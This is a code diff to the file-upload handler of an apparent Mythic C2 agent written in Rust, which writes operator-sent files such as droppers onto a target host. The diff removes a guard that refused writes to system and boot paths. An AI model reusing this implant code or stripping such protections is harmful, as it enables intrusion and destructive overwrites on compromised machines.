@@ -6,16 +6,13 @@
 //! payload — memory is bounded to ~16 KiB regardless of upload size.
 //!
 //! Enforces a hard size cap (default 256 MiB) to prevent the agent from
-//! filling the disk if the operator sends an oversized dropper, and refuses
-//! writes to obviously destructive locations unless the operator sets
-//! `allow_system_path: true`.
+//! filling the disk if the operator sends an oversized dropper.
 //!
 //! Task parameters (JSON):
 //! ```json
 //! {
 //!     "path": "/tmp/payload.exe",
 //!     "file_bytes": "<base64_encoded_contents>",
-//!     "allow_system_path": false,  // optional, default false
 //!     "max_bytes": 268435456        // optional, override cap (default 256 MiB)
 //! }
 //! ```
@@ -32,7 +29,7 @@ use mythic::{Artifact, TaskMessage, TaskResponse, TaskUpload};
 use serde::Deserialize;
 use uuid::Uuid;
 
-use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
+use crate::common::pathguard::{display_path, normalize_user_path};
 use crate::dispatch::PostResponseReceipt;
 
 // ── Params ──────────────────────────────────────────────────
@@ -50,10 +47,6 @@ struct Params {
     /// Mythic file UUID for chunk-pull uploads.
     #[serde(default)]
     file_id: Option<Uuid>,
-    /// When true, allows writes to system / boot directories that are
-    /// usually destructive to overwrite. Default false.
-    #[serde(default)]
-    allow_system_path: bool,
     /// Override the decoded-size cap. Clamped to [1, MAX_UPLOAD_BYTES].
     #[serde(default)]
     max_bytes: Option<u64>,
@@ -330,24 +323,14 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Err(e) => return TaskResponse::failed(task.id, &format!("upload parse error: {e}")),
     };
 
-    // 1. Path guard — refuse to overwrite system paths unless explicit opt-in.
     let dest = match upload_destination(&params.path, params.original_filename.as_deref()) {
         Ok(path) => path,
         Err(e) => return TaskResponse::failed(task.id, &e),
     };
     let dest = stable_write_path(dest);
     let path = dest.as_path();
-    if !params.allow_system_path && is_protected_path(&display_path(path)) {
-        return TaskResponse::failed(
-            task.id,
-            &format!(
-                "refusing write to system path {}; set allow_system_path=true to override",
-                display_path(path)
-            ),
-        );
-    }
 
-    // 2. Create parent directories if needed
+    // Create parent directories if needed
     if let Some(parent) = path.parent()
         && !parent.as_os_str().is_empty()
         && let Err(e) = std::fs::create_dir_all(parent)
